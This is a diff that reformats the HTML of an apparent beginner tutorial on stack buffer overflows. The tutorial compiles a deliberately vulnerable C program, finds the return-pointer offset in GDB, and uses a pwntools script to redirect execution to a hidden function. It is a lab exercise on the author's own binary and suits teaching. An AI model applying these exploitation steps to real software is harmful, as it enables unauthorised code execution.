@@ -1,72 +1,74 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-	<title>First buffer overflow attack</title>
-	<link rel="stylesheet" href="style.css" />
-	<script type="text/javascript" src="script.js"></script>
-	<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@600&family=Quicksand:wght@500&family=Saira+Stencil+One&family=Ubuntu:wght@500;700&display=swap" rel="stylesheet" />
-	<link rel="icon" href="https://vulnx.in/favicon.png" />
-	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css" />
-	<script data-ad-client="ca-pub-6203666289882469" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-	<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
-	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-	<meta name="HandheldFriendly" content="true" />
-	<meta name="keywords" content="VulnX, vulnx, vulnx.in, VulnX.in, hacking, Hacking, Buffer Overflow, Local variable, local variable, buffer overflow, bof, BoF, exploiting, binary exploiting, memory / corruption, memory, corruption, exploit, stack, overflow the stack, overwrite RIP, overwrite EIP, saved return pointer, remote code execution">
-	<meta charset="utf-8" />
-	<meta name="google-signin-client_id" content="7743864513-tbfn9rfgcgni8c2t8b9obgjpobeq0j7i.apps.googleusercontent.com" />
-	<script src="https://apis.google.com/js/platform.js?onload=renderButton" async defer></script>
+    <title>First buffer overflow attack</title>
+    <link rel="stylesheet" href="style.css" />
+    <script type="text/javascript" src="script.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@600&family=Quicksand:wght@500&family=Saira+Stencil+One&family=Ubuntu:wght@500;700&display=swap" rel="stylesheet" />
+    <link rel="icon" href="https://vulnx.in/favicon.png" />
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css" />
+    <script data-ad-client="ca-pub-6203666289882469" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="HandheldFriendly" content="true" />
+    <meta name="keywords" content="VulnX, vulnx, vulnx.in, VulnX.in, hacking, Hacking, Buffer Overflow, Local variable, local variable, buffer overflow, bof, BoF, exploiting, binary exploiting, memory / corruption, memory, corruption, exploit, stack, overflow the stack, overwrite RIP, overwrite EIP, saved return pointer, remote code execution">
+    <meta charset="utf-8" />
+    <meta name="google-signin-client_id" content="7743864513-tbfn9rfgcgni8c2t8b9obgjpobeq0j7i.apps.googleusercontent.com" />
+    <script src="https://apis.google.com/js/platform.js?onload=renderButton" async defer></script>
 </head>
+
 <body>
-	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-167461836-1"></script>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167461836-1"></script>
     <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-  
-      gtag('config', 'UA-167461836-1');
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'UA-167461836-1');
     </script>
-
     <div id="progressBar"></div>
-  
-    <ul class="topnav"><div class="x">
-      <img id="logo" src="../logo.png" />
-      <div style="display: flex; justify-content: row-reverse; align-items: center;"><li><a target="_blank" href="../">Home</a></li>
-        <li><a target="_blank" href="../Contents/resources.html">Resources</a></li>
-        <li><a target="_blank" href="../Contents/tutorials.html">Tutorials</a></li>
-        <li><a target="_blank" href="../Contents/CTFs.html">CTFs</a></li></div>
-      </div>
+    <ul class="topnav">
+        <div class="x">
+            <img id="logo" src="../logo.svg" />
+            <div style="display: flex; justify-content: row-reverse; align-items: center;">
+                <li><a target="_blank" href="../">Home</a></li>
+                <li><a target="_blank" href="../Contents/resources.html">Resources</a></li>
+                <li><a target="_blank" href="../Contents/tutorials.html">Tutorials</a></li>
+                <li><a target="_blank" href="../Contents/CTFs.html">CTFs</a></li>
+            </div>
+        </div>
     </ul>
-
     <div id="cookieBar">
-      <div id="cookieText">By using our site, you agree to our use of cookies to deliver a better site experience</div>
-      <div id="cookieButton" onclick="hideCookieBar()"><span></span><span></span><span></span><span></span>&#10005;</div>
+        <div id="cookieText">By using our site, you agree to our use of cookies to deliver a better site experience</div>
+        <div id="cookieButton" onclick="hideCookieBar()"><span></span><span></span><span></span><span></span>&#10005;</div>
     </div>
-
     <div id="align">
-    	<center><h1 style="color: #1b1b1b;">Buffer Overflow</h1></center>
-    	<center><h1 style="color: #1b1b1b;">First buffer overflow</h1></center>
-
-    	<p>Hey guys! What's up?</p>
-    	<p>Welcome to the fourth tutorial of the Buffer Overflow series. In the previous tutorial, we understood how the <span style="background-color: #dcdcdc; padding: 0 5px;">assembly : <span style="font-weight: bold;">ret</span></span> instruction works</p> and how if we overflow the stack buffer and overwrite the <i>saved return pointer</i> with an arbitrary address, we can redirect code execution to that address.
-
-    	<h2>Table of Contents :</h2>
-    	<ul>
-    		<li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Recap'">Quick recap of the 'ret' instruction</span></li>
-    		<li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Checking-for-buffer-overflow'">Checking for buffer overflow vulnerability</span></li>
-    		<li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Determining-correct-offset'">Determining the correct offset</span></li>
-    		<li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Fetching-the-address-of-callMe()'">Fetching the address of 'callMe()'</span></li>
-    		<li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Redirecting-flow-of-control'">Redirecting flow of control.</span></li>
-    	</ul>
-
-    	<span style="position: relative; top: -120px; visibility: hidden;" id="Recap"></span><h2>Recap of 'ret' instruction</h2>
-    	<p>Whenever a function is called, or the <span style="background-color: #dcdcdc; padding: 0 5px;">assembly : <span style="font-weight: bold;">call</span></span> instruction is executed, the memory address of the next instruction to be executed is push on the stack. Then the RIP [ the 64-bit instruction pointer register ] is changed to the base address of the function to be called. The function so called, sets up a new stack frame for itself to allow the storage of local variables and other data. At the end of the function, just before it returns back, the stack frame is destroyed and now, again the RSP points directly to the instruction which was pushed earlier on the stack.</p>
-
-      <p>This way the return address or return pointer is always saved on the stack and it is lies beneath the RBP [ like we had seen <span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer;" onclick="location.href='Understanding%20the%20concept%20of%20overwriting%20return%20pointer%20to%20acheive%20arbitrary%20code%20execution.html#Stack%20Layout'">here</span> ]. Therefore, if we write data past the base of the stack and correctly overflow the <i>saved return pointer</i>, with the address of an arbitrary function, the flow of control should be redirected there.</p>
-
-      <span id="Checking-for-buffer-overflow" style="position: relative; top: -120px;"></span><h2>Checking for buffer overflow vulnerability</h2>
-      <p>Before we begin, store the code snippet provided below in a file and compile it with the command commented in the script</p>
-
-      <pre><div id="snip"><b><span style="color: #aaa;">//  File name     : controlRIP.c
+        <center>
+            <h1 style="color: #1b1b1b;">Buffer Overflow</h1>
+        </center>
+        <center>
+            <h1 style="color: #1b1b1b;">First buffer overflow</h1>
+        </center>
+        <p>Hey guys! What's up?</p>
+        <p>Welcome to the fourth tutorial of the Buffer Overflow series. In the previous tutorial, we understood how the <span style="background-color: #dcdcdc; padding: 0 5px;">assembly : <span style="font-weight: bold;">ret</span></span> instruction works</p> and how if we overflow the stack buffer and overwrite the <i>saved return pointer</i> with an arbitrary address, we can redirect code execution to that address.
+        <h2>Table of Contents :</h2>
+        <ul>
+            <li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Recap'">Quick recap of the 'ret' instruction</span></li>
+            <li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Checking-for-buffer-overflow'">Checking for buffer overflow vulnerability</span></li>
+            <li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Determining-correct-offset'">Determining the correct offset</span></li>
+            <li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Fetching-the-address-of-callMe()'">Fetching the address of 'callMe()'</span></li>
+            <li style="margin: 10px 0;"><span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer; --webkit-tap-highlight-color: transparent" onclick="location.href='#Redirecting-flow-of-control'">Redirecting flow of control.</span></li>
+        </ul>
+        <span style="position: relative; top: -120px; visibility: hidden;" id="Recap"></span>
+        <h2>Recap of 'ret' instruction</h2>
+        <p>Whenever a function is called, or the <span style="background-color: #dcdcdc; padding: 0 5px;">assembly : <span style="font-weight: bold;">call</span></span> instruction is executed, the memory address of the next instruction to be executed is push on the stack. Then the RIP [ the 64-bit instruction pointer register ] is changed to the base address of the function to be called. The function so called, sets up a new stack frame for itself to allow the storage of local variables and other data. At the end of the function, just before it returns back, the stack frame is destroyed and now, again the RSP points directly to the instruction which was pushed earlier on the stack.</p>
+        <p>This way the return address or return pointer is always saved on the stack and it is lies beneath the RBP [ like we had seen <span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer;" onclick="location.href='Understanding%20the%20concept%20of%20overwriting%20return%20pointer%20to%20acheive%20arbitrary%20code%20execution.html#Stack%20Layout'">here</span> ]. Therefore, if we write data past the base of the stack and correctly overflow the <i>saved return pointer</i>, with the address of an arbitrary function, the flow of control should be redirected there.</p>
+        <span id="Checking-for-buffer-overflow" style="position: relative; top: -120px;"></span>
+        <h2>Checking for buffer overflow vulnerability</h2>
+        <p>Before we begin, store the code snippet provided below in a file and compile it with the command commented in the script</p>
+        <pre><div id="snip"><b><span style="color: #aaa;">//  File name     : controlRIP.c
 //  Compile with  : gcc controlRIP.c -m64 -no-pie -o controlRIP.elf</span>
 
 <font color="#55FFFF">#include</font> <font color="#FF55FF">&lt;stdio.h&gt;</font>
@@ -86,29 +88,24 @@
   func();
   <font color="#FFFF55">return</font> <font color="#FF55FF">0</font>;
 }</b></div></pre>
-
-      <div id="quote">The flag <span style="color: #000; font-weight: bold">-no-pie</span> disables PIE for the compiled application. This means that the binary will be unaffected by ASLR.</div>
-
-      <p>After compiling, when you feed normal input, it should work just fine</p>
-      <pre>
+        <div id="quote">The flag <span style="color: #000; font-weight: bold">-no-pie</span> disables PIE for the compiled application. This means that the binary will be unaffected by ASLR.</div>
+        <p>After compiling, when you feed normal input, it should work just fine</p>
+        <pre>
         <div id="snip"><span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># ./controlRIP.elf 
 Enter your username : root
 Sorry Mr. root, but you failed.
 <span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># </div>
       </pre>
-
-      <p>But notice when you feed more input than what was expected, you get a seg fault</p>
-      <pre>
+        <p>But notice when you feed more input than what was expected, you get a seg fault</p>
+        <pre>
         <div id="snip"><span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python3 -c 'print("A" * 100)' | ./controlRIP.elf 
 Enter your username : Sorry Mr. AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, but you failed.
 Segmentation fault
 <span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># </div>
       </pre>
-
-      <p>This clearly means that there is a buffer overflow vulnerability.</p>
-
-      <p>Now let's open up the program in GDB and crash it there</p>
-      <pre>
+        <p>This clearly means that there is a buffer overflow vulnerability.</p>
+        <p>Now let's open up the program in GDB and crash it there</p>
+        <pre>
         <div id="snip"><span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># gdb ./controlRIP.elf -q
 Reading symbols from <span style="color: #0f5; font-weight: bold;">./controlRIP.elf</span>...
 (No debugging symbols found in <span style="color: #0f5; font-weight: bold;">./controlRIP.elf</span>)
@@ -161,24 +158,17 @@ Stopped reason: SIGSEGV
 <span style="color: #8181ff;">0x0000000000401199</span> in <span style="color: #ff0; font-weight: bold;">func</span> ()
 gdb-peda$ </div>
       </pre>
-
-      <p>As you can see, the RIP points to the location of the crash. However, the RBP points to 0x4141414141414141 which is hex equivalent of 'AAAAAAAA'. This means that some 8 <span style="background-color: #dcdcdc; padding: 0 5px; font-weight: bold;">A</span> letters will be overwritten in the RBP.</p>
-
-      <p>So now our primary objective will be to determine the exact offset to overwrite the saved return pointer.</p>
-
-      <span id="Determining-correct-offset" style="position: relative; top: -120px;"></span><h2>Determining the correct offset</h2>
-      <p>Since we know that some 8 <span style="background-color: #dcdcdc; padding: 0 5px; font-weight: bold;">A</span>'s are overflowed to the RBP register, we can use a pattern like this :</p>
-      <div id="quote">AAAAAAAABBBBBBBBCCCCCCCC ...</div>
-
-      <p>to overflow the buffer. This way we can examine which 8 bytes overflowed the RBP and accordingly calculate the offset for <span style="font-weight: bold;">Base Pointer</span></p>
-
-      <p>So the entire pattern will be like this :-</p>
-
-      <div id="snip">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ</div>
-
-      <p>Now let's quickly feed this data to our binary</p>
-
-      <pre>
+        <p>As you can see, the RIP points to the location of the crash. However, the RBP points to 0x4141414141414141 which is hex equivalent of 'AAAAAAAA'. This means that some 8 <span style="background-color: #dcdcdc; padding: 0 5px; font-weight: bold;">A</span> letters will be overwritten in the RBP.</p>
+        <p>So now our primary objective will be to determine the exact offset to overwrite the saved return pointer.</p>
+        <span id="Determining-correct-offset" style="position: relative; top: -120px;"></span>
+        <h2>Determining the correct offset</h2>
+        <p>Since we know that some 8 <span style="background-color: #dcdcdc; padding: 0 5px; font-weight: bold;">A</span>'s are overflowed to the RBP register, we can use a pattern like this :</p>
+        <div id="quote">AAAAAAAABBBBBBBBCCCCCCCC ...</div>
+        <p>to overflow the buffer. This way we can examine which 8 bytes overflowed the RBP and accordingly calculate the offset for <span style="font-weight: bold;">Base Pointer</span></p>
+        <p>So the entire pattern will be like this :-</p>
+        <div id="snip">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ</div>
+        <p>Now let's quickly feed this data to our binary</p>
+        <pre>
         <div id="snip">gdb-peda$ run
 Starting program: /root/Desktop/Buffer Overflow/controlRIP.elf 
 Enter your username : AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ
@@ -228,26 +218,22 @@ Stopped reason: SIGSEGV
 <span style="color: #8181ff">0x0000000000401199</span> in <span style="color: #ff0">func</span> ()
 gdb-peda$ </div>
       </pre>
-
-      <p>As you can see above, the RBP is overwritten with 0x4949494949494949 ('<span style="font-family: 'Fira Code'">IIIIIIII</span>'). This clearly means that from AAA... all the way up to HHHHHHHH will be stored in the buffer and from <span style="font-family: 'Fira Code'">IIIIIIII</span> onwards, the rest of the data will be overflowed. Thus the offset for RBP is the number of bytes of the text :</p>
-      <div id="quote">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH</div>
-
-      <p>Since 'H' is the 8th alphabet and every alphabet is repeated 8 times thus the offset is :</p>
-      <ul>
-        alphabetical position x character frequency<br />
-        <span style="font-family: 'Fira Code'">==></span> 8 x 8<br />
-        <span style="font-family: 'Fira Code'">==></span> <div style="margin: 5px;"><span style="border: 2px solid #555a; padding: 5px">64</span></div>
-      </ul>
-
-      <p>Thus the offset for the RBP is 64. The <i>saved return pointer</i>, lies just beneath the base-pointer, thus the correct offset for the <i>saved return pointer</i> should be 64 + 8 [ since registers in a x64 system are of 8 bytes ].</p>
-
-      <p>This gives us the correct offset for the <i>saved return pointer</i> as 72. Let's test it before proceeding further. We will write 72 times the letter <span style="background-color: #dcdcdc; padding: 0 5px; font-weight: bold;">A</span> and 6 times the letter <span style="background-color: #dcdcdc; padding: 0 5px; font-weight: bold;">B</span></p>
-
-      <div id="quote" style="text-transform: uppercase; font-weight: bold; color: #333;">Note : The letter 'B' is repeated 6 times and not 8 because the RIP is a 6 byte register. Try to write more than 6 bytes in it and see what happens.</div>
-
-      <span id="Fetching-the-address-of-callMe()" style="position: relative; top: -120px;"></span><h2>Fetching the addressing of 'callMe()'</h2>
-      <p>Alright, now we need to find the exact address where <abbr title="Our AIM : The function to be called">'callMe()' </abbr> is located. We can do that by using <i>objdump</i> with our binary.</p>
-      <pre>
+        <p>As you can see above, the RBP is overwritten with 0x4949494949494949 ('<span style="font-family: 'Fira Code'">IIIIIIII</span>'). This clearly means that from AAA... all the way up to HHHHHHHH will be stored in the buffer and from <span style="font-family: 'Fira Code'">IIIIIIII</span> onwards, the rest of the data will be overflowed. Thus the offset for RBP is the number of bytes of the text :</p>
+        <div id="quote">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH</div>
+        <p>Since 'H' is the 8th alphabet and every alphabet is repeated 8 times thus the offset is :</p>
+        <ul>
+            alphabetical position x character frequency<br />
+            <span style="font-family: 'Fira Code'">==></span> 8 x 8<br />
+            <span style="font-family: 'Fira Code'">==></span>
+            <div style="margin: 5px;"><span style="border: 2px solid #555a; padding: 5px">64</span></div>
+        </ul>
+        <p>Thus the offset for the RBP is 64. The <i>saved return pointer</i>, lies just beneath the base-pointer, thus the correct offset for the <i>saved return pointer</i> should be 64 + 8 [ since registers in a x64 system are of 8 bytes ].</p>
+        <p>This gives us the correct offset for the <i>saved return pointer</i> as 72. Let's test it before proceeding further. We will write 72 times the letter <span style="background-color: #dcdcdc; padding: 0 5px; font-weight: bold;">A</span> and 6 times the letter <span style="background-color: #dcdcdc; padding: 0 5px; font-weight: bold;">B</span></p>
+        <div id="quote" style="text-transform: uppercase; font-weight: bold; color: #333;">Note : The letter 'B' is repeated 6 times and not 8 because the RIP is a 6 byte register. Try to write more than 6 bytes in it and see what happens.</div>
+        <span id="Fetching-the-address-of-callMe()" style="position: relative; top: -120px;"></span>
+        <h2>Fetching the addressing of 'callMe()'</h2>
+        <p>Alright, now we need to find the exact address where <abbr title="Our AIM : The function to be called">'callMe()' </abbr> is located. We can do that by using <i>objdump</i> with our binary.</p>
+        <pre>
         <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># objdump --help
 Usage: objdump &lt;option(s)> &lt;file(s)>
  Display information from object &lt;file(s)>.
@@ -347,10 +333,8 @@ with the -M switch (multiple options should be separated by commas):
 Report bugs to &lt;http://www.sourceware.org/bugzilla/>.
 </div>
       </pre>
-
-      <p>As you can see above, the highlighted line is what we are looking for. We must print the symbols in order to get the location of the callMe() function.</p>
-      
-      <pre>
+        <p>As you can see above, the highlighted line is what we are looking for. We must print the symbols in order to get the location of the callMe() function.</p>
+        <pre>
         <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># objdump -t controlRIP.elf 
 
 controlRIP.elf:     file format elf64-x86-64
@@ -425,28 +409,22 @@ SYMBOL TABLE:
 <b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span>#
 </div>
       </pre>
-
-      <p>Ah well, this seems a lot of output. Maybe we can do a little formatting and filtering?</p>
-
-      <pre>
+        <p>Ah well, this seems a lot of output. Maybe we can do a little formatting and filtering?</p>
+        <pre>
         <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># echo -n "Base Address: 0x"; objdump -t controlRIP.elf | grep callMe | awk '{print $1}'
 Base Address: 0x0000000000401142
 <b>root@kali</b>:<span style="color: #8181ff">~/Desktop/Buffer Overflow</span># </div>
       </pre>
-
-      <p>Alright we know 2 things now :</p>
-      <ol style="list-style-type: none;">
-        <li>Offset for saved return pointer <span style="color: #09f; font-weight: bold;">72</span></li>
-        <li>Address to be overwritten with: <span style="color: #09f; font-weight: bold;">0000000000401142</span></li>
-      </ol>
-
-      <span id="Redirecting-flow-of-control" style="position: relative; top: -120px;"></span><h2>Redirecting flow of control</h2>
-
-      <p>Okay we now have enough data to exploit this application. Let's make a script in python [ you can alternatively choose another language as well ] which will overflow the buffer and write the base address of the 'callMe()' function to the saved return pointer which according to our theory, should be popped in RIP causing the flow of control to reach that function.</p>
-
-      <p>I have used the script given below</p>
-
-      <pre>
+        <p>Alright we know 2 things now :</p>
+        <ol style="list-style-type: none;">
+            <li>Offset for saved return pointer <span style="color: #09f; font-weight: bold;">72</span></li>
+            <li>Address to be overwritten with: <span style="color: #09f; font-weight: bold;">0000000000401142</span></li>
+        </ol>
+        <span id="Redirecting-flow-of-control" style="position: relative; top: -120px;"></span>
+        <h2>Redirecting flow of control</h2>
+        <p>Okay we now have enough data to exploit this application. Let's make a script in python [ you can alternatively choose another language as well ] which will overflow the buffer and write the base address of the 'callMe()' function to the saved return pointer which according to our theory, should be popped in RIP causing the flow of control to reach that function.</p>
+        <p>I have used the script given below</p>
+        <pre>
         <div id="snip"><span style="color: #0ff; font-weight: bold;">from</span> pwn <span style="color: #0ff; font-weight: bold;">import</span> *                   <span style="color: #aaa">#   Import the sys module</span>
 <span style="color: #0ff; font-weight: bold;">import</span> sys                          <span style="color: #aaa">#   Import the sys module</span>
 
@@ -461,18 +439,14 @@ exploit += callMe                   <span style="color: #aaa">#   Now these byte
 sys.stdout.buffer.write(exploit)    <span style="color: #aaa">#   'exploit' is a byte-string so a normal print won't work.</span>
 </div>
       </pre>
-
-      <div id="quote"><span style="text-transform: uppercase; font-weight: bold">Note : The above script is of python3 and not python2. Also you must replace the memory address of <span style="text-transform: none; border-bottom: 1px solid #000;">callMe()</span> in your case.</span></div>
-
-      <p>Let's see what is the output of this script</p>
-      <pre>
+        <div id="quote"><span style="text-transform: uppercase; font-weight: bold">Note : The above script is of python3 and not python2. Also you must replace the memory address of <span style="text-transform: none; border-bottom: 1px solid #000;">callMe()</span> in your case.</span></div>
+        <p>Let's see what is the output of this script</p>
+        <pre>
         <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python<b>3</b> payload.py 
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXB@<b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># </div>
       </pre>
-
-      <p>You must keep in mind that the output is not just the "X", "B" & "@", when you view the hex output you will get something like this :-</p>
-
-      <pre>
+        <p>You must keep in mind that the output is not just the "X", "B" & "@", when you view the hex output you will get something like this :-</p>
+        <pre>
         <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python3 payload.py | xxd
 00000000: 5858 5858 5858 5858 5858 5858 5858 5858  XXXXXXXXXXXXXXXX
 00000010: 5858 5858 5858 5858 5858 5858 5858 5858  XXXXXXXXXXXXXXXX
@@ -482,73 +456,57 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXB@<b>roo
 <b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># 
         </div>
       </pre>
-
-      <p>As you can see there are more characters in between "B" and "@" but they aren't visible.</p>
-
-      <div id="quote"><span style="float: left; font-style: italic">Things aren't always as they seem, that is, until you see the hex!😂</span><br /><br /><span style="float: right">~VulnX</span></div>
-
-      <p>Okay, aside from this, the script should be 99% functional</p>
-
-      <p>We have reached the CLIMAX, now let's check if our script helps us acheive our objective</p>
-
-      <pre>
+        <p>As you can see there are more characters in between "B" and "@" but they aren't visible.</p>
+        <div id="quote"><span style="float: left; font-style: italic">Things aren't always as they seem, that is, until you see the hex!😂</span><br /><br /><span style="float: right">~VulnX</span></div>
+        <p>Okay, aside from this, the script should be 99% functional</p>
+        <p>We have reached the CLIMAX, now let's check if our script helps us acheive our objective</p>
+        <pre>
         <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python3 payload.py | ./controlRIP.elf 
 Enter your username : Sorry Mr. XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXB@, but you failed.
 <span style="font-weight: bold; font-style: italic">[+] Boom! Code execution redirected.</span>
 Segmentation fault
 <b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># </div>
       </pre>
-
-      <p>Woah! Look at that. Such a harmless looking vulnerability helped us call a function which was not supposed to be.</p>
-
-      <p>Imagine if you had a password-validation program, if you had such vulnerabilities you could possibly jump to a function which is called only if the password is correct by acheiving control over the RIP.</p>
-
-      <p>Anyway that's it for this tutorial.<br />We will meet in the next one where we will learn to execute a shellcode on the stack.</p>
-
-      <h2>Contact</h2>
-
-      <p>If you have any doubts or confusions in some part of the tutorial, feel free to reach out to me on my <span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer;" onclick="location.href='https://www.instagram.com/vulnx_hacking'">Instagram</span> or you can mail me at <span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer;" onclick="location.href='mailto:vulnx101@gmail.com'">vulnx101@gmail.com</span>, alternatively you can fill the form given below and we will get back to you as soon as possible</p>
-
-      <div id="contactForm" onclick="location.href='https://docs.google.com/forms/d/e/1FAIpQLScM7cjnyriiDIwM_8wFkS66cueS83lOaDoSsJ6dlM39szevcg/viewform?usp=sf_link'">
-        <button id="contactFormButton"><span id="buttonUnderline">Fill the Form</span></button>
-      </div>
-
-      <div id="align_right">
-        Good luck,<br />
-        VulnX<br />
-      </div>
-
-      <hr>
-
-    	<div class="icons">
-          	<a class="ico" href="javascript:delay('#')">
-            	<i class="fab fa-facebook-f"></i>
-          	</a>
-          	<a class="ico" href="javascript:delay('mailto:vulnx101@gmail.com')">
-            	<i class="fab fa-google"></i>
-          	</a>
-          	<a class="ico" href="javascript:delay('#')">
-            	<i class="fab fa-instagram"></i>
-         	</a>
-        	<a class="ico" href="javascript:delay('https://bit.ly/VulnX_YT')">
-        		<i class="fab fa-youtube"></i>
-        	</a>
+        <p>Woah! Look at that. Such a harmless looking vulnerability helped us call a function which was not supposed to be.</p>
+        <p>Imagine if you had a password-validation program, if you had such vulnerabilities you could possibly jump to a function which is called only if the password is correct by acheiving control over the RIP.</p>
+        <p>Anyway that's it for this tutorial.<br />We will meet in the next one where we will learn to execute a shellcode on the stack.</p>
+        <h2>Contact</h2>
+        <p>If you have any doubts or confusions in some part of the tutorial, feel free to reach out to me on my <span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer;" onclick="location.href='https://www.instagram.com/vulnx_hacking'">Instagram</span> or you can mail me at <span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer;" onclick="location.href='mailto:vulnx101@gmail.com'">vulnx101@gmail.com</span>, alternatively you can fill the form given below and we will get back to you as soon as possible</p>
+        <div id="contactForm" onclick="location.href='https://docs.google.com/forms/d/e/1FAIpQLScM7cjnyriiDIwM_8wFkS66cueS83lOaDoSsJ6dlM39szevcg/viewform?usp=sf_link'">
+            <button id="contactFormButton"><span id="buttonUnderline">Fill the Form</span></button>
         </div>
-
+        <div id="align_right">
+            Good luck,<br />
+            VulnX<br />
+        </div>
+        <hr>
+        <div class="icons">
+            <a class="ico" href="javascript:delay('#')">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+            <a class="ico" href="javascript:delay('mailto:vulnx101@gmail.com')">
+                <i class="fab fa-google"></i>
+            </a>
+            <a class="ico" href="javascript:delay('#')">
+                <i class="fab fa-instagram"></i>
+            </a>
+            <a class="ico" href="javascript:delay('https://bit.ly/VulnX_YT')">
+                <i class="fab fa-youtube"></i>
+            </a>
+        </div>
     </div>
     <div id="footer">
